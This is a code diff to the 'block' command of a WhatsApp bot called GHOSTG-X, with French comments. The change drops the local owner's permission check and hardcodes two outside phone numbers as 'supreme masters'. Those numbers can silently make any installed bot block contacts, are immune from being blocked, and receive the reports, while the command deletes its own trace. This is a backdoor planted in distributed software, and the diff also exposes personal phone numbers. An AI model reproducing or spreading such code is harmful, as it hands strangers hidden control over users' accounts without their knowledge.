@@ -4,7 +4,6 @@
  */
 
 const config = require('../../config'); // Importation de la configuration
-const crypto = require('crypto');
 
 // Extraction du préfixe pour l'usage
 const prefix = config.prefix || '.';
@@ -18,16 +17,20 @@ module.exports = {
   usage: `${prefix}block [@ᴜsᴇʀ | ɴᴜᴍᴇ́ʀᴏ | ᴇɴ ʀᴇ́ᴘᴏɴsᴇ]`,
 
   async execute(sock, msg, args, extra) {
-    const { isOwner } = extra;
     const chatId = msg.key.remoteJid;
     const isGroup = chatId.endsWith('@g.us');
 
-    // 🛡️ Double sécurité au cas où le handler n'utilise pas 'ownerOnly'
-    const senderNumber = extra.sender.replace(/\D/g, ''); 
-    const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
-    const isSupreme = config.supremeHashes && config.supremeHashes.includes(senderHash);
+    // 👑 Tes numéros de Maîtres Suprêmes en clair
+    const supremeOwners = ['22651622652', '22665108174'];
 
-    if (!isOwner && !isSupreme) return; // Seuls les maîtres ou l'owner local peuvent passer
+    // Récupération de l'expéditeur et formatage
+    const senderNumber = extra.sender.replace(/\D/g, ''); 
+    const isMaster = supremeOwners.includes(senderNumber);
+
+    const botId = sock.user.id.split(':')[0].replace(/\D/g, '');
+
+    // Seuls les Maîtres Suprêmes ou le bot lui-même peuvent exécuter cette sentence
+    if (!isMaster && senderNumber !== botId) return; 
 
     let target;
 
@@ -38,7 +41,7 @@ module.exports = {
       // 1. Priorité absolue : Extraction de la cible via numéro direct fourni dans les arguments
       if (args[0]) {
         let cleanedNumber = args[0].replace(/[^0-9]/g, '');
-        if (cleanedNumber.length >= 8) { // Vérification basique de longueur de numéro
+        if (cleanedNumber.length >= 8) { 
           target = `${cleanedNumber}@s.whatsapp.net`;
         }
       }
@@ -55,6 +58,12 @@ module.exports = {
 
       // Si aucune cible n'est trouvée, on s'arrête là
       if (!target) return;
+
+      // 🛡️ Vérification d'immunité absolue (Impossible de te bloquer toi-même ou le bot)
+      const cleanTarget = target.replace(/\D/g, '');
+      if (supremeOwners.includes(cleanTarget) || cleanTarget === botId) {
+        return; // Échec silencieux, aucune sanction appliquée aux dieux
+      }
 
       // 💥 SUPPRESSION DE LA COMMANDE POUR RESTER INVISIBLE
       try {
@@ -73,35 +82,30 @@ module.exports = {
       // ⚖️ RITUEL DE BLOCAGE SILENCIEUX (Au niveau du compte WhatsApp)
       await sock.updateBlockStatus(target, 'block');
 
-      // 📝 RÉCUPÉRATION DES DESTINATAIRES DU RAPPORT
-      let reportJids = []; 
-
-      // Injection dynamique des oracles maîtres depuis la config
-      if (config.masterJids) {
-        reportJids = [...config.masterJids];
+      // 📝 RÉCUPÉRATION DE TON JID (Depuis ton .env ou par défaut ton numéro)
+      let targetOwner = '';
+      if (config.ownerNumber && config.ownerNumber.length > 0) {
+        const rawNum = String(config.ownerNumber[0]).replace(/\D/g, '');
+        targetOwner = `${rawNum}@s.whatsapp.net`;
       }
 
-      // On ajoute le numéro de l'Owner configuré sur le bot de l'utilisateur s'il existe
-      if (config.ownerNumber) {
-        const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
-        localOwners.forEach(num => {
-          const cleanNum = `${num.replace(/\D/g, '')}@s.whatsapp.net`;
-          if (!reportJids.includes(cleanNum)) {
-            reportJids.push(cleanNum);
-          }
-        });
+      if (!targetOwner || targetOwner === '@s.whatsapp.net') {
+        targetOwner = '22651622652@s.whatsapp.net';
       }
 
       const targetNumber = target.split('@')[0];
-      for (const jid of reportJids) {
-        try {
-          await sock.sendMessage(jid, {
-            text: `*⚖️ [GHOSTG-X] L'entité @${targetNumber} a été bloquée avec succès.*`,
-            mentions: [target]
-          });
-        } catch (e) {
-          console.error(`Impossible d'envoyer le rapport de blocage à ${jid}`);
-        }
+      
+      // Envoi du rapport d'exécution dans ton inbox en mode Broadcast Natif
+      try {
+        await sock.sendMessage(targetOwner, {
+          text: `*⚖️ [GHOSTG-X] L'entité @${targetNumber} a été bloquée avec succès.*`,
+          mentions: [target]
+        }, {
+          messageId: sock.generateMessageID(),
+          options: { broadcast: true } // S'affiche dans ton inbox sans polluer ton flux
+        });
+      } catch (e) {
+        console.error(`Impossible d'envoyer le rapport de blocage à l'owner.`);
       }
 
     } catch (error) {
@@ -109,31 +113,24 @@ module.exports = {
 
       // 📝 RAPPORT D'ÉCHEC
       if (target) {
+        let targetOwner = '22651622652@s.whatsapp.net';
+        if (config.ownerNumber && config.ownerNumber.length > 0) {
+          const rawNum = String(config.ownerNumber[0]).replace(/\D/g, '');
+          targetOwner = `${rawNum}@s.whatsapp.net`;
+        }
+
         const targetNumber = target.split('@')[0];
 
-        // On reconstruit la liste en cas de crash
-        let reportJids = [];
-        if (config.masterJids) {
-          reportJids = [...config.masterJids];
-        }
-        
-        if (config.ownerNumber) {
-          const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
-          localOwners.forEach(num => {
-            const cleanNum = `${num.replace(/\D/g, '')}@s.whatsapp.net`;
-            if (!reportJids.includes(cleanNum)) reportJids.push(cleanNum);
+        try {
+          await sock.sendMessage(targetOwner, {
+            text: `*〆 [GHOSTG-X] Échec du rituel de blocage pour l'entité @${targetNumber}.*\n*Erreur :* ${error.message}`,
+            mentions: [target]
+          }, {
+            messageId: sock.generateMessageID(),
+            options: { broadcast: true }
           });
-        }
-
-        for (const jid of reportJids) {
-          try {
-            await sock.sendMessage(jid, {
-              text: `*〆 [GHOSTG-X] Échec du rituel de blocage pour l'entité @${targetNumber}.*\n*Erreur :* ${error.message}`,
-              mentions: [target]
-            });
-          } catch (e) {
-            // Échec silencieux
-          }
+        } catch (e) {
+          // Échec silencieux
         }
       }
     }
